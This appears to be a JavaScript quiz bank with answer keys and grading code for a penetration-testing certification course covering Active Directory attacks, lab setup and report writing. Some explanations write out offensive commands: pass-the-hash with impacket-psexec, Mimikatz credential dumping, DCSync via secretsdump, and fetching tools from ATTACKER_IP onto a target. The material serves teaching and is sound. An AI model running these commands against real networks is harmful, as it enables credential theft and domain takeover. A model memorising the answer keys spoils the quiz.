        'The krbtgt hash from the DC',
        'The NTDS.dit file'
      ],
      answer: 1,
      why: 'Any authenticated user can ask for a service ticket for any SPN-bearing account. The ticket is encrypted with that account’s password-derived key, so you take it away and brute force it offline.'
    },
    {
      q: 'Which hashcat mode goes with a `$krb5tgs$` hash?',
      options: ['18200', '13100', '1000', '5600'],
      answer: 1,
      why: '13100 is Kerberoast (TGS-REP etype 23); 18200 is AS-REP. Both numbers are worth memorising cold — you will not want to look them up under exam time pressure.'
    },
    {
      q: 'Which hashcat mode goes with a `$krb5asrep$` hash?',
      options: ['13100', '18200', '22000', '3200'],
      answer: 1,
      why: 'AS-REP roasting output is mode 18200. The pairing to keep straight: GetNPUsers → $krb5asrep$ → 18200, GetUserSPNs → $krb5tgs$ → 13100.'
    },
    {
      q: 'Why prefer roasting over password spraying when both are available?',
      options: [
        'Roasting is faster to run',
        'Roasting cracks offline, so no failed logins hit the DC and nothing locks out',
        'Spraying requires Domain Admin',
        'Roasting works without a network connection'
      ],
      answer: 1,
      why: 'The blob leaves the domain with you. Every guess after that happens on your own hardware, so there is no lockout risk and no authentication log trail from the guessing itself.'
    },
    {
      q: 'What does `-request` add to `impacket-GetUserSPNs`?',
      options: [
        'It authenticates to the DC',
        'It actually fetches the TGS tickets instead of only listing the SPNs',
        'It formats the output for hashcat',
        'It retries on failure'
      ],
      answer: 1,
      why: 'Without it you get an inventory of SPN accounts and nothing to crack. With it you get the `$krb5tgs$` blobs — and write them with `-outputfile`, never by copying from the terminal.'
    },
    {
      q: 'hashcat says "No hashes loaded" on a file you just roasted. Most likely cause?',
      options: [
        'The wrong hashcat mode',
        'The hash was hand-copied from the terminal and wrapped across lines',
        'The account changed its password',
        'rockyou.txt is still gzipped'
      ],
      answer: 1,
      why: 'This dead end is kept in the lesson. A Kerberos hash is one very long line; a terminal copy-paste breaks it. Re-run with `-outputfile` and hashcat loads it cleanly.'
    }
  ],

  // ── active-directory/03 — BloodHound ──────────────────────────────────
  'ad-03': [
    {
      q: 'Why is "Shortest Paths from Owned Principals" more useful than "Shortest Paths to Domain Admins"?',
      options: [
        'It runs faster on large domains',
        'It shows only the paths you can actually walk from accounts you control',
        'It includes session data the other query ignores',
        'It is the only query that shows DCSync rights'
      ],
      answer: 1,
      why: 'The generic query draws every theoretical route and returns spaghetti. Marking your accounts as Owned and querying from them collapsed the graph to the one two-hop path in the lesson’s worked example.'
    },
    {
      q: 'BloodHound shows `jsmith -GenericAll-> svc-backup`. What does that edge let you do?',
      options: [
        'Read svc-backup’s password',
        'Log on to any host svc-backup can',
        'Full control of the object — reset its password, or set an SPN and Kerberoast it',
        'Nothing without Domain Admin'
      ],
      answer: 2,
      why: 'GenericAll is full control over the object. The usual move is `net rpc password` (or PowerView’s Set-DomainUserPassword) to reset it and log in as that account, continuing the chain.'
    },
    {
      q: 'Which BloodHound edge is the direct route to dumping every hash in the domain?',
      options: ['AdminTo', 'MemberOf', 'DCSync (GetChanges/GetChangesAll)', 'CanRDP'],
      answer: 2,
      why: 'Replication rights let you impersonate a Domain Controller and ask for the directory’s secrets — including Administrator and krbtgt. BloodHound has a pre-built "Find Principals with DCSync Rights" query for exactly this.'
    },
    {
      q: 'You are running BloodHound CE. Do you start Neo4j yourself?',
      options: [
        'Yes — `sudo neo4j start` before launching it',
        'No — CE runs Neo4j inside its own Docker containers',
        'Only if collection was done with SharpHound',
        'Only on Kali, not on other distributions'
      ],
      answer: 1,
      why: 'That is the split that makes online guides contradict each other. CE is Docker and manages its own Neo4j; only the legacy Electron app needs you to start Neo4j and use neo4j:neo4j. Running `neo4j start` for CE just confuses things.'
    },
    {
      q: 'What is `-c all` doing in `bloodhound-python -c all --zip`?',
      options: [
        'Collecting from all domains in the forest',
        'Running every collection method — ACLs, sessions, group memberships and the rest',
        'Compressing all output files',
        'Authenticating with all available protocols'
      ],
      answer: 1,
      why: 'CollectionMethod all is what makes the graph complete enough to reason over. A partial collection can hide the exact edge you needed, and you will never know it was missing.'
    },
    {
      q: 'You want the exact command to abuse an edge BloodHound drew. Where do you look?',
      options: [
        'The Analysis tab',
        'Right-click the edge → Help — it carries the PowerView/impacket syntax',
        'The Neo4j console',
        'The SharpHound log'
      ],
      answer: 1,
      why: 'It is a built-in cheat sheet, kept current with the tooling. Faster and more reliable than remembering the syntax for a dozen different ACL abuses.'
    }
  ],

  // ── active-directory/04 — Lateral movement & credential access ────────
  'ad-04': [
    {
      q: 'Why does a dumped NT hash usually mean you do not need to crack anything?',
      options: [
        'The hash is reversible',
        'Windows authenticates with the NTLM hash, so the hash is the credential — that is pass-the-hash',
        'Hashcat cracks NT hashes instantly',
        'Because the LM half is always empty'
      ],
      answer: 1,
      why: 'Tools take `-H` in place of `-p` and authenticate directly. This is why credential *dumping* matters more than cracking on a domain — every hash you pull is immediately a key to the next host.'
    },
    {
      q: 'A hash reads `aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0`. Which half matters?',
      options: [
        'The first — it is the NT hash',
        'The second — the first is the well-known empty LM value',
        'Both must always be supplied together',
        'Neither; you need the plaintext'
      ],
      answer: 1,
      why: 'aad3b435b51404eeaad3b435b51404ee is the constant for an empty/disabled LM hash, and you will see it constantly. The NT half is the one that authenticates; tools accept either the full LM:NT string or just the NT part.'
    },
    {
      q: 'You are admin on a target and want a shell. What separates psexec from wmiexec?',
      options: [
        'psexec needs a password; wmiexec accepts a hash',
        'psexec gives SYSTEM but creates a service and logs an event; wmiexec is quieter, in your user context',
        'wmiexec only works on Domain Controllers',
        'psexec works over WinRM, wmiexec over SMB'
      ],
      answer: 1,
      why: 'Both take `-hashes`. Reach for psexec when you want SYSTEM and do not care about noise, wmiexec when you would rather not drop a service, and evil-winrm when 5985 is open — it is the nicest of the three.'
    },
    {
      q: 'What does `--lsa` pull that `--sam` does not?',
      options: [
        'Kerberos tickets',
        'The NTDS.dit database',
        'LSA secrets, which often hold service-account passwords in cleartext',
        'Browser-saved passwords'
      ],
      answer: 2,
      why: '--sam gives local account NT hashes; --lsa gives LSA secrets and cached domain credentials. Run both across the subnet with nxc and you harvest every host you are admin on in one sweep.'
    },
    {
      q: 'Why does BloodHound’s session data change where you point Mimikatz?',
      options: [
        'Sessions show which hosts are patched',
        'It shows where high-value users are logged in — dumping LSASS there hands you their credentials directly',
        'Mimikatz needs a session ID as an argument',
        'Sessions reveal the domain SID'
      ],
      answer: 1,
      why: 'A Domain Admin with a live session on a host you can reach short-circuits the entire ACL chain. `privilege::debug` then `sekurlsa::logonpasswords` and you have their credentials — no cracking, no path walking.'
    },
    {
      q: 'Describe the lateral-movement loop in the right order.',
      options: [
        'Crack hashes → spray → escalate → repeat',
        'Authenticate → find (Pwn3d!) hosts → dump credentials → use the new keys → repeat toward the DC',
        'Pivot → scan → exploit → report',
        'Enumerate → roast → DCSync → persist'
      ],
      answer: 1,
      why: 'Every dumped hash is a key and every (Pwn3d!) host is a place to find more keys. You loop until one key opens the Domain Controller.'
    }
  ],

  // ── active-directory/05 — Domain domination ───────────────────────────
  'ad-05': [
    {
      q: 'What is DCSync actually doing under the hood?',
      options: [
        'Copying NTDS.dit off the DC’s disk',
        'Impersonating a Domain Controller to request directory replication — the domain hands over its hashes',
        'Brute forcing the Administrator account',
        'Reading the SAM of every host in turn'
      ],
      answer: 1,
      why: 'It abuses a legitimate feature: DCs replicate secrets to each other. With GetChanges and GetChangesAll you look like a peer DC, so nothing is written to the target’s disk and no file is exfiltrated.'
    },
    {
      q: 'DCSync returns the Administrator and krbtgt hashes. What is each one for?',
      options: [
        'Both are just proof of compromise',
        'Administrator is your DA key for pass-the-hash; krbtgt signs all Kerberos tickets, enabling Golden Tickets',
        'krbtgt logs you into the DC; Administrator forges tickets',
        'Administrator is for SMB, krbtgt for LDAP'
      ],
      answer: 1,
      why: 'Pass the Administrator hash to psexec or evil-winrm and you have SYSTEM on the DC. The krbtgt key lets you forge a TGT for any user, which survives ordinary password changes — that is persistence, and it belongs in the report’s impact section.'
    },
    {
      q: 'What does `-just-dc` do in `impacket-secretsdump`?',
      options: [
        'Restricts the dump to the DC’s local SAM',
        'Performs the DCSync and pulls the domain’s NTDS credentials',
        'Skips the DC and dumps workstations',
        'Only lists accounts without dumping hashes'
      ],
      answer: 1,
      why: 'It is the flag that turns secretsdump into a DCSync. Narrow it with `-just-dc-user Administrator` when you only need the one hash and do not want the whole domain in your loot file.'
    },
    {
      q: 'You abuse an ACL to add yourself to a privileged group, and DCSync still fails with "rights not held". Why?',
      options: [
        'The change needs a domain reboot',
        'Group membership changes only apply on a fresh authentication — re-auth to get a new ticket',
        'ACL changes take 15 minutes to replicate',
        'DCSync requires Mimikatz, not impacket'
      ],
      answer: 1,
      why: 'Another dead end kept in. Your existing ticket was issued before the change and still carries the old group set. Start a new session and the new rights are there.'
    },
    {
      q: 'In the capstone chain, what connects the Network module to the AD module?',
      options: [
        'Kerberoasting',
        'The pivot — a Ligolo route from the compromised perimeter host to the internal AD subnet',
        'The report template',
        'BloodHound collection'
      ],
      answer: 1,
      why: 'Web app → service account → PrintSpoofer → SYSTEM → pivot → AD enumeration. The DC lives on a subnet only the first compromised host can see, which is why pivoting is the hinge between the two sections.'
    },
    {
      q: 'What proves Domain Admin at the end of the AD section?',
      options: [
        'A BloodHound path to Domain Admins',
        'A cracked service account password',
        'A SYSTEM shell on the DC via pass-the-hash, and the flag read from it',
        'A Golden Ticket in your session'
      ],
      answer: 2,
      why: 'A path is a plan, not a compromise. `impacket-psexec -hashes :<hash> corp.local/Administrator@dc01` returning `nt authority\\system` on the DC, plus the flag, is the evidence the report needs.'
    }
  ],
// ── labs/01 — Lab setup ───────────────────────────────────────────────
  'labs-01': [
    {
      q: 'A lesson says to use `ATTACKER_IP`. Where do you get that value?',
      options: [
        'The room page, next to the target IP',
        '`ip addr show tun0` — your address on the THM VPN',
        'Your home router’s public IP',
        '`whoami` on the target'
      ],
      answer: 1,
      why: 'There are two machines and two IPs. The target’s comes from the room page; yours is the tun0 address. Half of all "my reverse shell will not connect" problems are the wrong value here.'
    },
    {
      q: 'Why does the course keep saying never to type `10.10.x.x` literally?',
      options: [
        'It is a broadcast address',
        'It is a placeholder — substitute your own target’s real IP from the room page',
        'It only works on the AttackBox',
        'It needs to be in /etc/hosts first'
      ],
      answer: 1,
      why: 'Every lesson writes the target as 10.10.x.x so the command is copy-pasteable in shape, not in content. Typing it verbatim gets you a scan of nothing.'
    },
    {
      q: 'You run `ffuf -w /usr/share/seclists/...` and the path does not exist. Why?',
      options: [
        'The wordlist moved in the latest Kali',
        'SecLists is not installed by default — `sudo apt install seclists`',
        'ffuf needs sudo to read it',
        'The file is still gzipped'
      ],
      answer: 1,
      why: 'Kali ships most tools but not every wordlist. `/usr/share/wordlists/dirb/common.txt` does ship by default if you want to start fuzzing before the install finishes.'
    },
    {
      q: 'hashcat says rockyou.txt does not exist, but you can see `rockyou.txt.gz`. Fix?',
      options: [
        'Reinstall hashcat',
        'Point hashcat at the .gz directly',
        '`sudo gunzip /usr/share/wordlists/rockyou.txt.gz` — it ships compressed',
        'Download it from GitHub'
      ],
      answer: 2,
      why: 'A one-time decompression. It reads like a missing-file bug and is really just Kali saving disk space, which is exactly why it wastes a first-timer’s afternoon.'
    },
    {
      q: 'You started the VPN with `sudo openvpn yourname.ovpn`. What must you not do?',
      options: [
        'Open a second terminal for your work',
        'Close that terminal — it drops the VPN',
        'Start a target machine',
        'Run it before starting the room'
      ],
      answer: 1,
      why: 'openvpn runs in the foreground and holds the tunnel. Wait for "Initialization Sequence Completed", leave it be, and do everything else in another terminal.'
    }
  ],

  // ── labs/02 — Linux primer ────────────────────────────────────────────
  'labs-02': [
    {
      q: 'Your nmap fails with "Failed to open output file". What happened?',
      options: [
        'nmap needs sudo for -oN',
        'The target refused the scan',
        'The `nmap/` directory in the -oN path does not exist yet',
        'The filename has an invalid character'
      ],
      answer: 2,
      why: 'nmap will not create the folder for you. `mkdir -p ~/thm/boxname/{nmap,ffuf,loot}` at the start of every box prevents it and keeps all the evidence for that target in one place.'
    },
    {
      q: 'Why does running a downloaded script need `./linpeas.sh` rather than `linpeas.sh`?',
      options: [
        'The `./` makes it run as root',
        'Linux does not search the current directory for programs unless you say so',
        'It is required for shell scripts specifically',
        'It suppresses the script’s output'
      ],
      answer: 1,
      why: 'The current directory is deliberately not on PATH — otherwise a malicious `ls` dropped in a folder would run instead of the real one. Dot-slash means "the one right here".'
    },
    {
      q: 'A freshly downloaded binary says "Permission denied". What is missing?',
      options: [
        'sudo',
        '`chmod +x` — a download is not marked executable',
        'The file is corrupt',
        'It must be moved to /usr/bin'
      ],
      answer: 1,
      why: 'It applies to linPEAS, chisel, and Ligolo’s agent and proxy alike. The error names permissions, so it reads like a privilege problem, and it is really a two-second file-mode fix.'
    },
    {
      q: 'Why is `ls -la` the habit rather than plain `ls` on a compromised box?',
      options: [
        'It sorts by modification time',
        'It shows hidden dot-files — .ssh, .bash_history — which is where credentials live',
        'It follows symlinks',
        'It is faster on large directories'
      ],
      answer: 1,
      why: 'Plain ls hides anything starting with a dot. On a box you have just landed on, those hidden files are the highest-value reading: keys, history with passwords typed inline, config.'
    },
    {
      q: 'What is the "serve on Kali, fetch on target" pattern?',
      options: [
        '`scp` the file over SSH',
        '`python3 -m http.server 80` on Kali, then `wget http://ATTACKER_IP/file` on the target',
        'Mount an SMB share from the target',
        'Paste the file base64-encoded into the shell'
      ],
      answer: 1,
      why: 'It is how every "transfer the binary" instruction in the course actually happens, and it needs nothing installed on the victim. On Windows the fetch side becomes `certutil -urlcache -f`.'
    },
    {
      q: 'What does `grep -rin "pass" /home` do?',
      options: [
        'Replaces "pass" in every file',
        'Recursive, case-insensitive search with line numbers',
        'Restricts the search to readable files only',
        'Renames matching files'
      ],
      answer: 1,
      why: 'Recurse, ignore case, show line numbers. It is the single most-used credential-hunting command in the course — worth being able to type without thinking.'
    }
  ],

  // ── labs/03 — Networking & shells primer ──────────────────────────────
  'labs-03': [
    {
      q: 'Why is a reverse shell the standard rather than a bind shell?',
      options: [
        'It is encrypted',
        'Firewalls usually block inbound connections to the victim but allow outbound ones',
        'It survives a reboot',
        'Bind shells need root on the target'
      ],
      answer: 1,
      why: 'A bind shell asks the victim to open a listening port, which is exactly what a firewall stops. A reverse shell rides the outbound path that is already permitted, so it works where a bind shell will not.'
    },
    {
      q: 'What does `172.16.5.0/24` mean in practice?',
      options: [
        '24 hosts on that network',
        'The address 172.16.5.24',
        'Every machine whose IP starts 172.16.5. — 256 addresses',
        'A subnet reachable only over UDP'
      ],
      answer: 2,
      why: 'The /24 says the first 24 bits are the network part. Read it as "this whole little network" — it is what lets `nxc smb 172.16.5.0/24` sweep the range in one command.'
    },
    {
      q: 'Which two services justify running a UDP scan?',
      options: ['SSH and HTTP', 'DNS (53) and SNMP (161)', 'SMB and RDP', 'FTP and WinRM'],
      answer: 1,
      why: 'nmap is TCP by default, so a UDP-only service is simply invisible until you add -sU. SNMP is the one people skip, and it leaks processes and sometimes credentials.'
    },
    {
      q: 'What is the difference between a web shell and a reverse shell?',
      options: [
        'A web shell is encrypted; a reverse shell is not',
        'A web shell runs single commands through the browser; you upgrade it to a proper interactive reverse shell',
        'They are two names for the same thing',
        'A web shell only works on Windows'
      ],
      answer: 1,
      why: 'shell.php?cmd=id is a foothold, but you cannot use an interactive tool through it. The move you will make in web/04 is to fire a reverse-shell one-liner through that web shell and catch it on your listener.'
    },
    {
      q: 'Why does the version behind a port matter so much?',
      options: [
        'It tells you the operating system',
        'A specific version maps to known public vulnerabilities; a bare "http" does not',
        'Older versions are always faster to scan',
        'It determines whether the port is TCP or UDP'
      ],
      answer: 1,
      why: '"Apache 2.4.49" is a searchsploit query with an answer. "http" is a shrug. That gap is the entire reason -sV is worth the extra scan time.'
    }
  ],

  // ── labs/04 — Methodology & notes ─────────────────────────────────────
  'labs-04': [
    {
      q: 'You are stuck on a box. What does the methodology say that almost always means?',
      options: [
        'The box is broken — reset it',
        'You need a better exploit',
        'You have not enumerated enough — go back to recon and look wider',
        'You need to escalate privileges first'
      ],
      answer: 2,
      why: 'The way in is almost always something you find, not something you cleverly force. A port you skipped, a directory you did not fuzz, a service you did not check — that is where the hours go.'
    },
    {
      q: 'Reporting is phase 5. When do you actually do it?',
      options: [
        'At the end, once every box is owned',
        'Continuously — each finding written the moment you get it',
        'Only for the web section',
        'After the exam window closes'
      ],
      answer: 1,
      why: 'Cold documentation at hour 40 loses the details and the time. Paste the flag and the evidence into the finding template the moment you have them, while the terminal output is still on screen.'
    },
    {
      q: 'Name the five phases in order.',
      options: [
        'Scan → Exploit → Escalate → Pivot → Report',
        'Recon → Enumeration → Exploitation → Post-exploitation → Reporting',
        'Enumeration → Recon → Exploitation → Reporting → Post-exploitation',
        'Recon → Exploitation → Enumeration → Reporting → Post-exploitation'
      ],
      answer: 1,
      why: 'Naming the phase you are in is what makes "what do I do next?" answerable. When stuck, name it and ask honestly whether you finished it.'
    },
    {
      q: 'What is the point of one folder per box with nmap/, ffuf/ and loot/ inside?',
      options: [
        'It makes the tools run faster',
        'Your report gets assembled from files rather than from memory',
        'It is required by the exam environment',
        'It keeps the VPN connection stable'
      ],
      answer: 1,
      why: 'Scan output, Burp saves and downloaded loot land there as you work. At writing time you are quoting evidence you already have, not trying to remember what a scan said two days ago.'
    },
    {
      q: 'How long should you spend on one service before moving on?',
      options: [
        'Until it breaks — never leave a service unfinished',
        'Time-box it: roughly 30 minutes with nothing to show, then note it and move on',
        'Five minutes maximum',
        'As long as it takes; there is no time pressure on PT1'
      ],
      answer: 1,
      why: 'Fresh eyes find things a stuck brain will not, and the exam is timed. Note where you stopped so coming back costs nothing — that note is also report material.'
    }
  ],

  // ── reporting/01 — Writing the PT1 report ─────────────────────────────
  'reporting-01': [
    {
      q: 'You write a perfect vulnerability write-up but never paste the flag. What happens?',
      options: [
        'The write-up quality carries the score',
        'You lose the flag allocation — reviewers report it can cost more than half a section',
        'You lose a few points',
        'The grader asks you to supply it'
      ],
      answer: 1,
      why: 'The flag is the anchor of the finding, scored separately from the prose. Find it, paste it, then write around it — never the other way round.'
    },
    {
      q: 'Your instinct says the right category is "Insecure Direct Object Reference via API". The dropdown has "Broken Access Control". Which do you use?',
      options: [
        'The custom label — it is more precise',
        'The closest predefined category from the dropdown',
        'Both, separated by a slash',
        'Leave it blank and explain in the write-up'
      ],
      answer: 1,
      why: 'Custom categories do not score. Precision you invent is worth zero points; the closest predefined value is worth the full allocation.'
    },
    {
      q: 'How should the section summary be written on PT1?',
      options: [
        'Business-friendly prose an executive could act on',
        'Technical and keyword-dense, naming vulnerabilities, tools and impact terms',
        'A bulleted list of flags only',
        'As short as possible'
      ],
      answer: 1,
      why: 'Counter-intuitive but sourced: a candidate wrote a polished management-style summary and the AI grader penalised it. The summary is around 20% of that section — write it like a dense technical abstract. In a real engagement you would do the opposite.'
    },
    {
      q: 'Which five fields must every finding carry?',
      options: [
        'Title, severity, screenshot, date, author',
        'Flag, category, CVSS, write-up including recon, remediation',
        'CVE, CVSS, exploit code, patch, vendor',
        'Host, port, service, version, exploit'
      ],
      answer: 1,
      why: 'An empty field is a guaranteed zero for that allocation, and a mediocre-but-present entry beats a blank. Note that recon — how you found it — belongs inside the write-up; a grader expected it there.'
    },
    {
      q: 'Where is careful reporting worth the most points per item?',
      options: [
        'Active Directory — 74 points a flag',
        'Network — two machines, four flags',
        'Web — roughly 95 points per vulnerability across five scored sub-fields',
        'The executive summary'
      ],
      answer: 2,
      why: 'Web is 400 of 1000 but has the highest per-item value and the most sub-fields to fill, so it is where thin reporting bleeds the most. Network and AD are the faster, more reliable points to bank early.'
    },
    {
      q: 'How much evidence should you paste into a finding?',
      options: [
        'A short summary of what you saw',
        'Real terminal output and the raw HTTP request/response — the more the better',
        'Screenshots only',
        'A link to your notes'
      ],
      answer: 1,
      why: 'Screenshots were not even possible in the exam environment. The grader treats pasted evidence generously, so paste the actual output rather than describing it.'
    }
  ],

  // ── reporting/03 — CVSS quick reference ───────────────────────────────
  'reporting-03': [
    {
      q: 'What does `PR:N` in a CVSS vector mean, and why does it matter?',
      options: [
        'No public reference — lowers the score',
        'No privileges required — the attacker needs no account, which raises the score',
        'Partial read access only',
        'Physical proximity required'
      ],
      answer: 1,
      why: 'PR is what access the attacker needs before they start. None is the worst case. Setting PR:L because a foothold is needed is what pulls a 9.8 down into the High band.'
    },
    {
      q: 'Why does reflected XSS score lower than stored XSS?',
      options: [
        'It affects fewer browsers',
        'Reflected needs a victim to click — `UI:R` — and lands a lighter C/I impact',
        'Stored XSS has a network attack vector and reflected does not',
        'Reflected XSS is not a real vulnerability'
      ],
      answer: 1,
      why: 'Reflected is 6.1 Medium with UI:R and C:L/I:L; stored is 7.4 High because it fires on every visitor with a heavier confidentiality hit. Both carry S:C — the payload escapes its own component into the victim’s session.'
    },
    {
      q: 'What does Scope `S:C` (Changed) represent?',
      options: [
        'The vulnerability changes over time',
        'The impact breaks out of the vulnerable component into other systems or users',
        'The CVSS score was revised',
        'The attack changes the target’s configuration'
      ],
      answer: 1,
      why: 'It is why XSS carries S:C — the flaw is in the server’s output handling but the damage lands in another user’s browser session. Changed scope bumps the score up.'
    },
    {
      q: 'Which vector is the right starting point for unauthenticated SQLi that dumps the database?',
      options: [
        '`CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`',
        '`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` — 9.8 Critical',
        '`CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N`',
        '`CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:N`'
      ],
      answer: 1,
      why: 'Remote, no auth, no interaction, full C/I/A. That 9.8 vector is shared by SSTI to RCE, unrestricted upload to RCE, unauthenticated command injection and weak default credentials — one string covers a lot of findings.'
    },
    {
      q: 'What is the 30-second method for scoring a finding?',
      options: [
        'Copy the score from a similar CVE',
        'Start at Critical and come down: does it need auth (PR), interaction (UI), does it escape scope (S), what does it hit (C/I/A)',
        'Always score High unless it is trivial',
        'Score it after the report is finished'
      ],
      answer: 1,
      why: 'Do not agonise. A sensible justified score with the vector pasted earns the CVSS allocation; a blank earns zero. Match one of the ready-made rows and adjust the metric that differs.'
    },
    {
      q: 'Local privilege escalation via sudo or SUID — which metric changes first from the 9.8 template?',
      options: [
        'Scope becomes Changed',
        'AV becomes Local and PR becomes Low — you already need a shell on the box',
        'Availability drops to None',
        'AC becomes High'
      ],
      answer: 1,
      why: 'It scores 7.8 High on `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`. You cannot escalate privileges you do not yet have, so the remote-unauthenticated framing simply does not apply.'
    }
  ]
}

/**
 * Written out by hand, the right answer drifts to whichever slot felt natural
 * while authoring — here it piled up at index 1 across three quarters of the
 * bank. "Pick the second one" would then beat actually knowing the material,
 * which is the one thing a self-check quiz must never allow.
 *
 * So the served order is derived from the question text: same question, same
 * shuffle, every render and every session — a learner's selection never jumps
 * under them — but across the bank the answer lands everywhere. Authors keep
 * writing questions in whatever order reads best.
 */
function hash (text) {
  let h = 0x811c9dc5
  for (let i = 0; i < text.length; i++) {
    h ^= text.charCodeAt(i)
    h = Math.imul(h, 0x01000193) >>> 0
  }
  return h
}

function shuffleQuestion (q) {
  const order = q.options.map((_, i) => i)
  let seed = hash(q.q)
  // Fisher-Yates driven by a seeded LCG, so the permutation is reproducible.
  for (let i = order.length - 1; i > 0; i--) {
    seed = (Math.imul(seed, 1664525) + 1013904223) >>> 0
    const j = seed % (i + 1)
    ;[order[i], order[j]] = [order[j], order[i]]
  }
  return {
    ...q,
    options: order.map((i) => q.options[i]),
    answer: order.indexOf(q.answer)
  }
}

const served = new Map()

/** Questions for a lesson id, or null when that lesson has no quiz yet. */
export function quizFor (lessonId) {
  if (!lessonId) return null
  const questions = QUIZZES[lessonId]
  if (!questions) return null
  if (!served.has(lessonId)) served.set(lessonId, questions.map(shuffleQuestion))
  return served.get(lessonId)
}

/** Score an attempt. Unanswered counts as wrong — that is the honest read. */
export function grade (questions, answers = []) {
  const total = questions.length
  const wrong = []
  let right = 0

  questions.forEach((q, i) => {
    if (answers[i] === q.answer) right++
    else wrong.push(i)
  })

  const pct = total === 0 ? 0 : Math.round((right / total) * 100)
  return { right, total, pct, passed: total > 0 && pct >= PASS_PCT, wrong }
}
